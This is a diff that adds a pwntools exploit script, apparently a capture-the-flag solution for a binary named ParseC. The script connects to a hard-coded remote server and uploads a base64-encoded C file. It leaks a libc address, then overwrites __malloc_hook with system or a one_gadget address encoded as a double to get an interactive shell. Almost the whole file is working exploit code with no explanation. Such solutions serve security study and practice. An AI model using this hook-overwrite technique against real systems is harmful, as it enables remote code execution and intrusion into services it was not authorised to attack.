@@ -1,0 +1,121 @@
+#!/usr/bin/env python3
+#-*- coding:utf-8 -*-
+# Author: i0gan
+# Env: Linux arch 5.8.14-arch1-1
+
+from pwn import *
+import os
+import base64
+import struct
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+context.log_level='debug'
+context.terminal = ['tmux', 'splitw', '-h']
+
+elf_path  = './ParseC'
+libc_path = './libc.so.6'
+#libc_path = './libc6_2.27-3ubuntu1.2_amd64.so'
+libc_path = './libc-2.27.so'
+#libc_path = './libc6_2.27-3ubuntu1_amd64.so'
+#libc_path = '/glibc/2.27/64/lib/libc.so.6'
+
+
+# remote server ip and port
+server_ip = "123.57.4.93"
+server_port = 34007
+
+# if local debug
+LOCAL = 0
+LIBC  = 1
+
+#--------------------------func-----------------------------
+def db():
+	if(LOCAL):
+		gdb.attach(io)
+
+def float_to_hex(f):
+	return hex(struct.unpack('<I', struct.pack('<f', f))[0])
+
+def double_to_hex(f):
+    return hex(struct.unpack('<Q', struct.pack('<d', f))[0])
+ 
+def double_to_long_int(f):
+    return struct.unpack('<Q', struct.pack('<d', f))[0]
+
+def hex_to_double(d):
+	d = p64(d)
+	data = struct.unpack("d", d[:8])
+	return data
+	
+#--------------------------exploit--------------------------
+print('double_hex: ' + double_to_hex(1.0))
+print(hex_to_double(0x3ff0000000000000))
+print(hex_to_double(0x1000))
+
+def exploit():
+	li('exploit...')
+	if(LOCAL == 0):
+		fd = open('./exp.c', 'rb')
+		d = fd.read()
+		fd.close()
+		sla(':', base64.b64encode(d))
+		ru('-------------------------------------------------------\n')	
+	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
+	libc_base = leak - 0x3ebc40 - 1184
+	li('libc_base: ' + hex(libc_base))
+
+	#target = libc_base + libc.sym['__malloc_hook'] - 0x28
+	target = libc_base + libc.sym['__malloc_hook'] - 0x28
+	gadget = [0x4f3c2, 0x10a45c]
+	one_gadget = libc_base + gadget[0]
+	one_gadget = libc_base + libc.sym['system']
+	t = str(hex_to_double(target)).split(',')[0][1:]
+	o = str(hex_to_double(one_gadget)).split(',')[0][1:]
+	li('target = ' + hex(target) + ' double: ' + t)
+	li('one_gadget = ' + hex(one_gadget) + ' double: ' + o)
+	db()
+	sleep(1)
+	t = t.ljust(0x20, '\x00')
+	s(t)
+	sleep(1)
+	#raw_input('get_shell')
+	#o = '\x00' * 8 + o
+	o = o.ljust(0x20, '\x00')
+	#for _ in range(2):
+	s(o)
+
+def finish():
+	ia()
+	c()
+
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		elf = ELF(elf_path)
+		if LIBC:
+			libc = ELF(libc_path)
+			io = elf.process(['exp.c'], env = {'LD_PRELOAD' : libc_path})
+			#io = elf.process()
+		else:
+			io = elf.process()
+	
+	else:
+		elf = ELF(elf_path)
+		io = remote(server_ip, server_port)
+		if LIBC:
+			libc = ELF(libc_path)
+
+	exploit()
+	finish()
